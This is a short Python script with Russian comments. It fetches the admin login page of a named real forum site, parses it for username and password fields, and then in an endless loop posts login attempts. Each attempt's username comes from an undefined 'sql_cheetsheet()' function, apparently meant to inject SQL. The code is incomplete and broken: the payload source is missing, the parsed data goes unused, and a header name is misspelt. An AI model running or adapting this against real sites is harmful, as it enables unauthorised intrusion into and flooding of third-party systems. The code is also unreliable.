import requests
from bs4 import BeautifulSoup as bs

headers = {
    'Host': 'python-forum.io',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Languagev': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://python-forum.io/admin/index.php',
    'Content-Type': 'application/x-www-form-urlencoded'
}
# Открываем стандартную сессию для получения sessid и, по возможности cookie
with requests.session() as sess:
    # Отправляем гет запрос для получения содержимого веб страницы.
    data = sess.get('https://python-forum.io/admin/index.php').text
    # парсим содержимое на наличие инпутов, так как именно они могут быть уязвимы
    soup = bs(data, 'lxml')
    # Создаем генератор, который удостоверяется в том, что в
    # спаршенных данных есть поля ввода, которые отправляются на сервер
    while True:
        parsed_data = "".join([str(items) for items in soup.findAll('div', {'class': 'field'}) if
                               "username" in str(soup.findAll('div', {'class': 'field'}))
                               or "password" in str(soup.findAll('div', {'class': 'field'}))])
        response = sess.post('https://python-forum.io/admin/index.php', data={'username': f'{sql_cheetsheet()}',
                                                                              'password': '123',
                                                                              'do': 'login'})
        print(response.text)
